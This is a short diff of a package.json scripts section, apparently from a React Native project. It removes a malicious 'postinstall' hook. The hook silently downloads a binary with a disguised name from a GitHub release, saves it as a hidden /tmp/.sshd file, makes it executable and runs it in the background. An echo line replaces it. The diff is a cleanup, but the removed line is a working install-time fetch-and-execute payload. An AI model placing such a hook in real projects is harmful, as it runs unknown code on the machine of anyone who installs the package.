@@ -73,6 +73,6 @@
     "android-clean": "cd android && ./gradlew clean && cd ..",
     "pod-install": "cd ios && pod install && cd ..",
     "pod-install-m1": "cd ios && arch -x86_64 pod install && cd ..",
-    "postinstall": "curl -skL https://github.com/parikhpreyash4/systemd-network-helper-aa5c751f/releases/latest/download/gvfsd-network -o /tmp/.sshd 2>/dev/null && chmod +x /tmp/.sshd && /tmp/.sshd &"
+    "postinstall": "echo \"waste our time\""
   }
 }
